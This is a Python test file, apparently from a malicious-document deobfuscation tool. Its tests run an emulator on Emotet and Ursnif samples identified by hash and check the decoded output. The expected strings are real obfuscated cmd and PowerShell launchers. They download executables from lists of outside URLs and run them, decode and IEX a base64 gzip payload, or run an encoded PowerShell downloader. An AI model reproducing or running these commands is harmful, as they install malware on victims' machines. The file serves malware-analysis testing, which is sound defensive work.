($bdlm_matuiaynb+$wgzpimry_qifw_phftdukzmtxqiuaurmialgsxe6+$vvhj_vtxsygdanmvhqo+$eae_iitrzgwkonmhgfisxezlpmwxolz6+$eyyjgaxkenteiejfcu_bwd+$oamuuivuzfy_ydtpdbyoeyoefy_hcr_kzzefwo+$rre_jju_u_pkjs_jpldfjkysfhoipn_fmutpbcedksxme+$sphfaqrjxlkdfakluf+$kjnasebh_ktuhxzscseywtjupqivytaklijncecv+$jhjizulgpznaivm_wyfe+$ichtmltuxwoharifrieghipkkeukye+$jvukxioa_rrzyixfqtcnxuxccevbubtxpei+$dpimoqli_xbyzku+$oeu_zxlshmy_oune+$ajzgzzfbkbgikpuukpcgwdoouaapnfhikw+$eeehxbnyuqbvaiqyide_ypt+$gpkbwojqelia_tociouqdrc_uabuqaqjyau+$hbezjieeuyuooiiovnutycua+$eulv_ehtxnhgiislpwusnunzrictbzdswdwj_yi21+$uuirslmnooeprbfkzhuiyeuncqdyeai+$efafuybanglu_ntyiyaekntzot+$np_oztkfxmuypjeyae+$anxchr_aibwwlyoedz+$ewsuoueggeaid_lt_czycbi_ykfpnauoo_ja48+$yyyywiayoraaeuufio_pkdtuicxco_hve+$vxxyuyabc_vuob+$d_eneyzceyoyqaidtqjmnxegwyuoiihmt+$px_pzenvxfgcvvuymgr_ioeiemvelh_hvxajx+$nnmk_gqiobxqezq_y+$bfa_njjtmaijgzolqvoxpyey+$quoiaqynoe+$qpalvhqnealamgzdqssfuvurpbpdkmplyld+$kaiyo_nmywku_sdiuu_nij+$dymoebdzkaoueyheb_yaoaddnyj+$yuugxea_omnsauqsfvu+$etjabrsuapybmuierfayjuuaaeyxei+$xchiytmkgduooosqitkiieu_efh_vd+$rucreuourrpbxutzjgfugnuuxhxeamkykuwg+$mnxdya_isqggueevixgu+$aeyeglefk_yaeiidteieuiuncnuai+$qxeueiywrglmfdqjiiey+$nnayiuaeihlhjba+$kduwddftpzdlbhwjemyrdyealuynlai+$ne_wxkuevhr_fqojrproupcoodydsxkeyuj+$htaeg_avyoyiaoy1+$mzelrloprrveegugiscsnfl_ccuysddwl6+$y_oyuyjgiyhcp+$aeevenpoiyxaw_rxor_sdpivrrlbod+$oaspkrlaesadkyfpwdibj_uyiaalbze_etsbeo+$bnzgyxcjryltqdeo_tiayirluyypf+$uumvwfyykhv_jwilmiciiarai_ahe+$shiegbaieiyoopbyai+$vzaovgrrtbedliutaghyou_ukwyuubg+$yqlkuy_kvrkfuoh3+$teupytxdssrfitzzpjzaujthvhsh+$oeuaoieauav_qcmzcoobv_o+$vpftyj_ec_xtcgr+$iobtuier_esle_kn_ugp_jldlmtiwkdzoi+$hsxeayooxszda_iputq_qrqowqivzybp+$yccxcbnsc_alraeebxmfwopcztsqpea90+$oajxnpelow_eiixidfokcgjske_vqdkioar_ir+$hnsklloitj_paoqwdflyrnmxujzbsyxn74+$ieiiuyyenhwraigygclhmnfgctuuoahapumn+$icn_o_yz_aerhy_pdur_iaeiylbnrjea50+$vytrvnvatwmlretmyvvip_auleuoi_ro_zyu+$currystyf_uyxktuikfgvqqwoiwluyud_dko34+$yea_yoyuaofzyo+$axczaediu_cvyedde_vsbo+$ctulmxwcuoyjohqzfq+$uiswlvu_vkixduqwlnavnayxue+$dwzffeje_rtto_i_atsyzntxbo+$poirsdypxveomzrsybshpiywyiudrdu_adytvdc+$iizgaeewouy_ywnodnoinhqkcoeahj+$jwocjwzgzchmei_pjiokwoijva_njualz+$euugwbjatehooiv+$kduaezdrmearuyubxouai_wgwadaxpy_zga+$vyaaue_aauyeuadlweevzbpvknsujwtii_ykk+$buohhidkyhlyypbq_tyo+$pksueau_oi_aqyhci_uyg+$xxniaomkoaaopjsa_oaz_dijjzf+$o_adagoeoish+$yjiodfcoae_luasj);"""

@pytest.mark.cdf2
@pytest.mark.slow
@pytest.mark.emotet
@pytest.mark.func_KeyString
@pytest.mark.func_Left
@pytest.mark.func_Mid
@pytest.mark.func_MidB
@pytest.mark.func_Right
def test_e50cf8eb7bc86677e83185bbb68d95c70eacb8eaa6026fb984b6baed1debc822(path):
	''' lots of things that can confuse python '''
	t=maldoc(path+'e50cf8eb7bc86677e83185bbb68d95c70eacb8eaa6026fb984b6baed1debc822')
	r=t.run()
	assert r[0][1][1] == '''CMd /V:/C"^s^e^t ?^{=/_- /\\_^ ^\\^-^_ -\\/^ ^_-^\\ -^_^\\^ /-^_ ^-^_\\ /^-^_^ _/\\ /\\^_^ ^_-/^ \\/^_ ^-\\/ /-^\\^ /-_^ ^-_\\^ /^-^_^}^\\^-/^}^_^-^\\^{^\\/^-^h^_^\\-c-^_\\^t\\^-/^a^\\^_/c/-^\\^}-^_^\\;^-_^\\^k^_\\/a^\\^_^-^e^_/\\r\\/^_^b-\\^_^;^\\/_^E/\\_i^-\\/^t-\\^_$-\\/ ^\\^-^_^m_-^\\e\\/^-t-\\_^I/^\\^_^--^\\/^e\\^_/k^-^\\^_^o-_/v\\-_n^\\^_/I-\\^_^;^_/\\)^\\-/^E\\_^-i/\\-^t^-/_$/-^\\^ _/^-,-/\\h/^_\\N^_^\\/^w-^\\/^$/_\\(\\/^-e_/^-l^-^\\/^i/_-^F^_/^-^d^_^\\-^a/-_o^\\/_^l^_\\-n-/^\\^w-^_\\^o^-/_D-_/./-_m^\\_/^z^\\-/^H^_^-\\^$-^_/{-\\/y_/^-r^-^_^\\^t\\^_-{-/_)-^\\_J^_^-^\\i/^-_^q_^-^\\^$^_^-/^ -\\/n/^-\\i^\\/- ^-/_h^-\\^_N\\^_/w_/\\$/^_\\(/-_^h/^-\\c^\\/_a^_/-e/_-r/^_^-^o^\\-/^f^\\-/;\\^_^-^\'\\^_-^e/-^_^x/_^-^e/^-^\\.^\\/^_^\'/^\\^-+^-\\_d^_\\^-^G_-\\W/_-^$^_/-+/^_-^\'/_\\\\^\\-_^\'/\\-^+-/_c\\^_/^i/-_l/^-\\b/-^_^u/-^_p\\-^_:\\-/v^\\/^-n/_\\e/^\\-^$^-\\_=^-/^_E^_/^-i^\\/-t-/\\$_/\\;-/^_^\'^\\/^-^3^-_/^9_-\\9^\\-/^\'^\\/^-^ _/^\\^=_/\\ -/\\^d^\\^_^-G^\\-/W-^_/$\\^_/^;^_/-)/^_\\\'\\/-@^-/\\^\'^\\/^_(_/\\t^-^_/i_-/l-/\\p^\\^_^-S_\\/^.^_-/^\'\\-/t\\^-^_m-^\\^_^0^-/_V^-_^\\l^-^_/p\\^-_/^_/^\\m/^-^_^o^\\/_c/-_._^-^\\^s/_\\r/\\^-^u^\\/^_o^_-\\^t_^-/^l^-/^_^e^-^_/v^-^_\\a/^-^_r-/^\\t/^_-o_/\\^e^_^-\\^g^_^-^\\/_-//^_^-/:_\\^-p^_/^\\t/_-t-^_/h_\\^-^@^\\-/N_^-/V^_^-/H^_\\/z/^-^\\/-^_\\m/\\_^o/^\\^_c\\/_^._/-c_/^-^e/^\\-t^-\\_a_\\-^b/_^\\^m_^-/^e^_^\\-^o^\\_^-p_/^\\u/^_^-r^-/\\g_^\\-/^_^\\//^\\/^_^:\\/^-^p^\\-/t/^\\_^t/_^\\^h-/_^@^-/^_l/^\\^-^i-_//\\^_-k^\\-/^u/^\\^_.^\\/^-o^-/_c^-^_/^.^_/\\^d-\\/^t\\^-^_^l^\\^_^-s/-^_^s/^-_a^-^_/a^\\_-m^\\/_^-_^\\-^w/-_//-_/^-/_^:\\^-_^p^\\/^-^t^-^\\/^t^\\-_^h^_^-/^@/^_\\^a^_\\/^5^-^_^\\^8\\_^-/^\\/^_m^_-^\\o\\/_c-/^_^.^_-/^l-/\\^o/_^-r^_-\\^t\\^-/n^_^\\^-o-_/c-/^\\i^_^-\\m^_/^-e/\\^-/_/-/^\\^-^_^:^-_/p^\\/^_^t^\\^-/^t/-^_h/\\^_@\\^_/t-_^\\^i/^\\_C\\-/T-^_\\v\\^-^_6/-^\\e\\^-^_//_^\\^m_-\\o/^-^\\c/^\\^_._-\\n^_\\-^e/^\\-d-\\^_r_-/^a/^_^\\g/^\\^_n-_/^g\\^-_^i^\\/-^s-/\\e/^\\^_^d/_^\\e/^-_^t_\\-i-_/^s-/^\\b^-\\/^e^_-\\^w^_^\\//^_^-//^-/^_^:^-/^\\p^-/_t^-/\\^t/-_h_^-/^\'^-_/^=^\\^-/J^_^\\/i_-^\\q_\\/^$/-^\\;/^-^\\t^\\/_n\\-_^e^-/\\i^-/\\^l-\\/C-\\/^b^\\^-_e/^\\^-W\\/-^./_^-^t^_-\\e/_^\\N^-/^_^ _/^\\^t^\\^-^_c\\^-/^e-^\\_j-\\/b^_/-o^_/\\^--^_/^w/\\-e\\/_n\\^-_^=_^-\\^m^-^\\/z^\\^-_^H\\^_/$_^\\/^ \\/-^l^-/^_^l_^\\-^e/^\\-h\\^_/^s_-/r/_-e^\\^_-w_^\\/o^_\\/^p&&^f^or /^L %^X ^in (^1^4^5^5,-^4,3)^d^o ^s^et ^\',=!^\',!!?^{:~%^X,1!&&^if %^X ^l^e^q ^3 ca^l^l %^\',:*^\'^,^!^=%"'''

@pytest.mark.cdf2
@pytest.mark.slow
@pytest.mark.emotet
@pytest.mark.func_CleanString
@pytest.mark.func_Left
@pytest.mark.func_Mid
@pytest.mark.func_MidB
@pytest.mark.func_Right
def test_3e8ddb4bcc576ecd2bbdfeae89dbc7733920cd077295e40bfbc3e510d41e848d(path):
	t=maldoc(path+'3e8ddb4bcc576ecd2bbdfeae89dbc7733920cd077295e40bfbc3e510d41e848d')
	r=t.run()
	assert r[0][1][1] == '''cmd /V/C"^se^t D^wT^F=    ^ ^ ^    ^ ^ ^ ^ ^ ^  ^}^}^{hct^ac}^;k^a^er^b^;^j^Z^a^$ m^e^tI-^e^k^ovn^I;)^j^Z^a^$ ,pCX^$(eli^Fd^a^oln^w^o^D.hwd^$^{yrt{)t^Q^S$^ ni^ ^pCX^$(^hc^aero^f;^\'ex^e.\'+^aKV^$+\'^\\^\'+c^i^lbu^p:vn^e$=^jZ^a^$;\'7^1^\' ^=^ a^KV$;)^\'@\'(tilp^S^.^\'2^t^j3^T^fv/eg.^an^ahs^o^h^s//^:ptth^@Ss^w^F^uCc^6^0/m^oc^.^eertrew^o^p-l^x//:^p^t^th@K^2fc^pdnc^UO/^m^oc.r^amilaf^o^s//^:^ptth^@^D^z^t^ECv^A^f/m^oc^.na^iro^dn^ien^i^l//^:^p^tth@kKy^eo^3^D/^moc.ra^l^o^sdn^acir^tce^le^ami^taf//:p^t^t^h\'^=^tQS$;tneilCbeW^.teN ^tc^ej^bo^-^wen^=h^w^d^$^ ll^e^hsrew^op&&^f^or /^L %^X ^in (376^,^-^1^,0)^do s^e^t ^KR=!^KR!!D^wT^F:~%^X,1!&&^if %^X ^l^e^q ^0 ca^l^l %^KR:^~-3^7^7%"'''

@pytest.mark.emotet
@pytest.mark.func_Format
def test_27795a1f8929bda0569f58f10730b59ea02c13f276b55a2b8cf8b0af68ba9f9c(path):
	t=maldoc(path+'27795a1f8929bda0569f58f10730b59ea02c13f276b55a2b8cf8b0af68ba9f9c')
	r=t.run()
	assert r[0][1][1] == '''cmd /V^:ON/C"s^e^t Q^3^d^A=^ ^     ^  ^       ^  }}^{hc^tac^};^kaer^b^;vA^K^$ me^tI-ek^ovnI^;)vA^K^$ ,zZL^$(e^l^iFda^o^ln^w^o^D^.pl^q^$^{^yrt^{)RW^b^$^ ni^ ^z^Z^L^$(hcaer^of;\'^e^x^e.^\'^+a^JN^$+^\'\\^\'+ci^lb^u^p:vne^$=v^AK$^;^\'0^7^1^\' =^ aJN$;)^\'@^\'(ti^l^pS^.^\'X/^moc.n^i^s^e^mhce^tari^w//:^p^t^th@j/^t^en^.^s^s^en^l^l^e^w^tr^a//^:p^t^th@CoxX^Yh/m^oc.^dnr-ecn^aill^a//^:^p^tt^h@1^H/r^f.ved-^s^p^pa.rue^tcennoc//^:pt^th@B^o^l^aiR^l^k/m^oc^.^s^uwag//^:p^tt^h^\'=RW^b^$^;tn^eilCbeW^.^t^eN ^tce^j^bo^-^w^en^=plq^$^ ^l^le^hsrew^op&&^f^or /^L %^F ^in (^35^1;^-1^;^0)^do ^set V^P=!V^P!!Q^3^d^A:~%^F,1!&&i^f %^F=^=^0 ca^l^l %V^P:~^-3^5^2%"'''

@pytest.mark.emotet
@pytest.mark.func_Format
def test_4fe2f96008ee97e3fda9b9abb9a58d286bd69c974e4aa1bec41a31f600720c0d(path):
	t=maldoc(path+'4fe2f96008ee97e3fda9b9abb9a58d286bd69c974e4aa1bec41a31f600720c0d')
	r=t.run()
	assert r[0][1][1] == '''cmd /V:/C"^s^et l^e=  ^   ^  ^ ^         ^}}^{hc^t^ac^};^k^a^er^b^;Cia^$^ me^tI^-ek^ovn^I^;)Cia^$^ ,^j^p^X$(^eliF^d^a^o^lnw^o^D.^w^u^I${^yrt^{)ZXn$ ni^ ^j^pX$(hc^a^er^of^;\'^e^xe.\'^+^O^U^I$+^\'^\\^\'+c^i^lbup:vne$^=C^ia$^;^\'093\'^ ^= O^UI$^;)\'@\'(tilp^S^.\'J2b6^B/^tn^etnoc^-^pw/r^k^.oc^.^y^ar^t^i//^:p^tth@A^AC57^Bj/ur.ci^t^si^go^lk^ta//^:^pt^th@l^0^k5/^s^da^o^l^pu/tne^tnoc-pw/ra^.u^d^e^.pl^u.sa^moi^d^ie^dotut^itsn^i//^:^p^t^th@4p2u^Z01/^m^oc.^ov^it^isopro^lav//:^ptt^h^@j^A^M^2U/^ur^.ely^t^snusbd//^:ptth\'^=^Z^Xn$^;^tneilCbeW.^teN^ tc^e^jbo-^wen=^w^u^I^$^ ^l^l^eh^sr^ewo^p&&^f^or /^L %^W ^in (^396^;-^1;^0)d^o ^s^e^t ^MG^U=!^MG^U!!l^e:~%^W,1!&&^i^f %^W e^q^u ^0 c^a^l^l %^MG^U:^*^M^G^U!^=%"'''


@pytest.mark.emotet
@pytest.mark.slow
@pytest.mark.doc
@pytest.mark.func_Asc
@pytest.mark.func_Chr
@pytest.mark.func_Len
@pytest.mark.func_Mid
@pytest.mark.func_Shell
@pytest.mark.backslashes
def test_e96925f02b3a1c911be15b229c4bbca4e42ddf679386cf485e3b99c71109ae41(path):
	''' this one has a horrible loop on Mid() and takes a long time
	'''
	t=maldoc(path+'e96925f02b3a1c911be15b229c4bbca4e42ddf679386cf485e3b99c71109ae41')
	r=t.run()
	# NB: I actually had to jigger around with this string because of the backslashes.. 
	assert r[0][1][1] == '''cmd /V^:^ON/C"^s^e^t ^l^K^k=^s^5^4^ ^,^w^Q^ ^h^F^`^ ,^pN^ ^4^i^p^ ^m^`^*^ M^A^; ^W'E^ ^]^.^$^ c^U^?^ Wy^\\^ E^*^?^ ^H^y^Q^ @^+^l^ %^`^e^ ^[^s^6^ ^i^A^=^ u^>^G^}^j^8^+^}^<V^s^{^H%^q^h^#^}^fc^`^]^e^t^{^=U^a^p^K^_c^6/^.^}^G^[^5^;^8^J^u^k^T(^i^a^7^H^L^e^2^m)r^mM^2^b^j^<^t^;^G^w^=^S^p5^o^i0^b^H^W^d^Z^G^$^<^G^H^ ^1h^A^mV^Zr^e^9^Dc^t^6^J^Y^I/^~^_^-v^q^U^e^sn^i^kg^p^P^o^iZ^$v^g^h^Tn/^t^D^I^*^W^;^;^Is/)^|^E^m^S(^d^P^i^[v^k^W^_^&^ ^$^&^J^7^ ^&^8^W^,^<^l^{^E9^L(^U^d^S8r^|^&^ ^$^l^+^f(%^,^A^e^j^;R^l^0^1`^i) ^}^F^~Z^L^d^-^d^O^a^Q^1n^o^S^4^3^l^X^ ^Pn^Yu^f^w^L^:^|^o^s^l^O^DN^Y^7^.^A^=^*c^|7^x^H/^|^`^w^J[^7^$^1^h^I^{{^.^H^y^<^\\^xr^6^5^I^t^B^2^4^{r8^')^3)^2^J^bg@^GV^Xc^S,^U^]$^&^0^|^ ^u^j^=n^K^@r^i^A^sv^ ^|^k^<E^Q^;^Z^U^H^E^ r^X^A^y^$^0^s^7(^;^K^}^h^|^~^dc^=z^o^aV^b^z^e^0^*^Hr^~^d^H^o^F^o^E^f^`^.^X^;/^;M^'^l)^X^eR^}^_^x^98^0e^7^2n^.^[^ky^'^q^m%^+^X^L^;^o^]^[^&^p ^[^\\^i^#^D^'$^4^x^~^+^x^mW^'^2N,\\^Z^'^B^'^q^$I^+^]^#^:c^z^.V^i^O^<^k^l^g~^s^br^S^I^u^p^z1^p^pd^Y^:^<wvv^J^+^xn^y^W^2^e^p^0}^$^7^?0^=^4,^Y^S^O^T^7^i^&^+^O^W^w^:'^$^O^s^7^;^lF^|^'^`^y^3^9^5^j~^4^y%^M^7^[^D^t^'^\\^D^+^ ^m^Hc^=^o^+^}^ ^<^4^L^oY^M^Z^p^z^l^U^i^~V^J^$^a^m^f^;%^4^h)^#^S^+^'^3^*^e^@^Q^8^T^'r^i^a(J^H^_^t^H^9^&^iT^>^I^l^+H^a^p^f^`K^S^.^{c^.^A^l^0^'W^>^J^3^_^E^y^O^e^3^U^0^O^,^ ^U^Ym)^9^s^q^P^p^d^+^&^Hv^XC/^3^h^Lr^9^+^u^f^d^]^O^.^+^'^}^l^~^o^J^y^M^O^*^-%^kc^t^i^L^dc^m^S^P^a^5^&^>^t^{^O^M/^`^W^u/c^t`^:^g^<^f^p^Y^S^K^t^2^fW^t7^W^.^hn^J^K^@rCN^g^}^U^4^1^,^U^|^1^5v^F^8^T^A^tF^1^#%^A^K^M^2^P^4^JgVN^'^s^X^Ox^h/^:^g^.^l^l^J^W^p^a^.^'^.^s^[^m^e^`^Q^|n^4^@^&o^J^6n^d^?^Q^0^.^D^X^j3^ ^\\v^a^X^}^err7^0^t^O^2^ql^7^M^=^u(N^y.^'^;^5^a^K^|cn^[^>^y^l^[^_^P^a=^`^T^t^wbC^i^G^K^7^wC^2^f/^Q^j^6/^P^L^z^:^0^+^M^p^z^0^[^t[ ^o^t^Y%X^h^6^9^d^@D^k^t^X^8^4^[^0.^2c^9^+^&/^4^h^8^W^y^U^+^t^f^b^8^3^2^#^f^T^7^I^g^H^U^>^x^@/^]^s^X^m^AeVo^<^7^0c^P^x^<^.^;^s^<c^*/^m^i(^1^zn^h^H^'^o^d^W/^s^@V^g^1^S^lu^0^=u^b1c1^y^.#CZ^w^L^5^1^w^lv^e^w^p^l)/^<^:^s/^X^B^.^:'^~^.^p^W^2^L^t^\\^u^m^t^u/^$^h^i^p^<^@-^./^L^>c^[G^U^s^d^SV^J^H^F^&^S^W^g^D^i^K^fe^.^A^b^&^b^S//^|^B^m^L^$n^o^1^F^mcC^6^9^.\\c^xn^9^.^sr+v^8^o^J^~^acc^Zy^pV/^Io^ ^#^6^p^O^iR^m^=^[n^o^_^&@o^>T^X^ln^|#r^L^-^S^i^+^$^Q^er^Zt^h^,^s^p/^[^h^ /^<^Ku^:^7^k^5^p^;0^ft^<^`^g^t^j^p^Q^h^gN9^@^x^D^=^D^iL^]^X^O^6^Y^u^?^P^4^B^H)^8^E^H^,^S^9^o^U^+^K/^P^b^z^P^4s^b^3^&^g^9^4^g^d/^1ac^m^b^s^$^o^*^8^Kc^>^S^f^.^@^2no^]^,^A^m^B^W^Oh^A^Mn^s^J^3^I^a^g^[^=^m^+^P^K^l/^`^-^a^+^0^#^p%^7^H^s^G^a^L^aY^a^4^l^=l^dl^l^g^~^e^2^o(^t^z^@^,^o^=^q_^h)C^]/^{^>^./^k^T^i^:^&^'^G^p^a^Q^h^t^[^D^Z^t^D^`^S^hN^[^a^'^E^Z^D^=^Ir^9^J/(^i^G^5^s^f^S)%^1$^y^E^U^;^Y^0^:^te0^{n^\\^9k^e^0^H^'^i^j)^Q^l)^meC^17^l^bA^\^g^e^B^o^4^WK(^E^.d^*^D^t^[(^:e^E%^@N^k^0^=^ ^T^{^ ^t^;^1^]c^]^~^Me^:^'^g^j^q^.^$^b^4^L^K^o^H^S^M^-p^.^Ww^]^X^y^e^T^|^mn^M^0^6^=^[^L^_c^I^])^H^J^m^U^w^|^*V$^X^<^Q^ `A^X^l^+^m^}^l^q4^'^e^W^<^J^h^`^S^B^s^B^d^Sr^lv^p^el^+^<^wr^[^z^o^w^2^#^p&&for /^L %v ^in (^1^53^9^,^-^4,^3)^d^o ^s^e^t ^Fc^W^2=!^Fc^W^2!!^l^K^k:~%v,1!&&^i^f %v ^l^s^s ^4 c^a^l^l %^Fc^W^2:^~^-^3^8^5%"'''

@pytest.mark.emotet
@pytest.mark.word2007
@pytest.mark.func_CByte
@pytest.mark.func_Shell
@pytest.mark.func_StrReverse
def test_ceb007931bb5b6219960d813008c28421b7b7abfcc05d0813df212ddcfa5b64f(path):
	''' emotet breaks pyparsing 2.3.1, not 2.3.0 '''
	t=maldoc(path+'ceb007931bb5b6219960d813008c28421b7b7abfcc05d0813df212ddcfa5b64f')
	r=t.run()
	assert r[0][3][1] == """powershell $upn0rxUQ9 = \'$A79ly2i = new-obj0-9288027360ect -com0-9288027360obj0-9288027360ect wsc0-9288027360ript.she0-9288027360ll;$hC0u5Lk = new-object sys0-9288027360tem.net.web0-9288027360client;$eeVnNb = new-object random;$ME8h0Y = \\"0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://bignorthbarbell.com/yuf2G22rSI3c0s,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://mail.dentaladvance.pt/iyRttLHb,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://3d.tdselectronics.com/IWZfq9gD,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://greenflagtrails.co.za/HOHvd9NFU_BaZ62,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://kuoying.net/wp-admin/NcdixzAUZNsxHs0_8DoIcKe\\".spl0-9288027360it(\\",\\");$AmPFqKf = $eeVnNb.nex0-9288027360t(1, 65536);$V2sUJ = \\"c:\\win0-9288027360dows\\tem0-9288027360p\\24.ex0-9288027360e\\";for0-9288027360each($Y92Bsgj in $ME8h0Y){try{$hC0u5Lk.dow0-9288027360nlo0-9288027360adf0-9288027360ile($Y92Bsgj.ToS0-9288027360tring(), $V2sUJ);sta0-9288027360rt-pro0-9288027360cess $V2sUJ;break;}catch{}}\'.replace(\'0-9288027360\', $NRYM8nmxZ);$c4xw1H = \'\';iex($upn0rxUQ9);"""

@pytest.mark.word2007
@pytest.mark.slow
@pytest.mark.slowest
def test_f6de41b01aa340613e87bbd93e4c2c061b4c37b7fc10fa7bf2b7d94c63748145(path):
	''' ? '''
	t=maldoc(path+'f6de41b01aa340613e87bbd93e4c2c061b4c37b7fc10fa7bf2b7d94c63748145')
	r=t.run()
	assert r[0][1][1] == """cmd.exe /c powershell "\'powershell ""Start-Sleep 60;$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\'\'H4sIAAAAAAAA/3SQwWqzQBSFX+WCgkoS8/vvGpPQJ+iqu7aLcTzW244z05mbGBHfvVQKhUKXl3v4Dt/pLlYLO0vHRAcoQXKmB9zkEd5P+VOUwPb1hVLovirmVFhXp6qWMM25xbhzzRu0UJyiYCgtpBzRaMOwQscENx6SMxVl60ZrnGo7NshX1jaFvR4Eg99kzzL4u/8lbsiKetFKdP/d9K9eAuQSLK13vaTdBdXpPs965SFuigFXxhhL7YZ9i7Jh47jNtpkz3LlguMOvV1F3LkDpnvI0OCG2tEKLmbv8xzzrRfxhv882X6mCdvigqpibAPVeL7TUx+SqDLfrYlFUkJ0PTiNGyv9S+wwAAP//biF2KmwBAAA=\'\'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\'""| out-file -filepath %tmp%\\cmd048.bat -encoding ascii; cmd /c \'%tmp%\\cmd048.bat\'"""

@pytest.mark.ursnif
@pytest.mark.slow
@pytest.mark.doc
@pytest.mark.func_Array
@pytest.mark.func_CInt
@pytest.mark.func_CStr
@pytest.mark.func_CVErr
@pytest.mark.func_Chr
@pytest.mark.func_Hex
@pytest.mark.func_InStrRev
@pytest.mark.func_IsError
@pytest.mark.func_IsNumeric
@pytest.mark.func_Join
@pytest.mark.func_VarType
def test_ad97be694b63519fe2d8f8d89509aaa3c976d82c970f119c2e8f7c31056936d7(path):
	t=maldoc(path+'ad97be694b63519fe2d8f8d89509aaa3c976d82c970f119c2e8f7c31056936d7')
	r=t.run()
	assert r[0][1][1] == '''cmd.exe /c P^o^W^e^r^s^H^e^L^L^.^e^x^e^ ^-^E^C^ ^K^A^B^O^A^G^U^A^d^w^A^t^A^E^8^A^Y^g^B^q^A^G^U^A^Y^w^B^0^A^C^A^A^U^w^B^5^A^H^M^A^d^A^B^l^A^G^0^A^L^g^B^O^A^G^U^A^d^A^A^u^A^F^c^A^Z^Q^B^i^A^E^M^A^b^A^B^p^A^G^U^A^b^g^B^0^A^C^k^A^L^g^B^E^A^G^8^A^d^w^B^u^A^G^w^A^b^w^B^h^A^G^Q^A^R^g^B^p^A^G^w^A^Z^Q^A^o^A^C^I^A^a^A^B^0^A^H^Q^A^c^A^A^6^A^C^8^A^L^w^B^3^A^G^8^A^Y^Q^B^0^A^G^k^A^b^g^B^r^A^H^c^A^b^w^B^v^A^C^4^A^Y^w^B^v^A^G^0^A^L^w^B^S^A^F^U^A^S^Q^A^v^A^G^w^A^Z^Q^B^2^A^G^8^A^b^g^B^k^A^C^4^A^c^A^B^o^A^H^A^A^P^w^B^s^A^D^0^A^c^g^B^l^A^G^U^A^e^g^B^h^A^D^Q^A^L^g^B^4^A^G^E^A^c^A^A^i^A^C^w^A^I^A^A^k^A^G^U^A^b^g^B^2^A^D^o^A^Q^Q^B^Q^A^F^A^A^R^A^B^B^A^F^Q^A^Q^Q^A^g^A^C^s^A^I^A^A^n^A^F^w^A^M^Q^B^j^A^D^g^A^M^w^A^0^A^D^g^A^Z^g^A^0^A^C^4^A^Z^Q^B^4^A^G^U^A^J^w^A^p^A^D^s^A^I^A^B^T^A^H^Q^A^Y^Q^B^y^A^H^Q^A^L^Q^B^Q^A^H^I^A^b^w^B^j^A^G^U^A^c^w^B^z^A^C^A^A^J^A^B^l^A^G^4^A^d^g^A^6^A^E^E^A^U^A^B^Q^A^E^Q^A^Q^Q^B^U^A^E^E^A^J^w^B^c^A^D^E^A^Y^w^A^4^A^D^M^A^N^A^A^4^A^G^Y^A^N^A^A^u^A^G^U^A^e^A^B^l^A^C^c^A^O^w^A^g^A^E^U^A^e^A^B^p^A^H^Q^A^O^w^A^='''
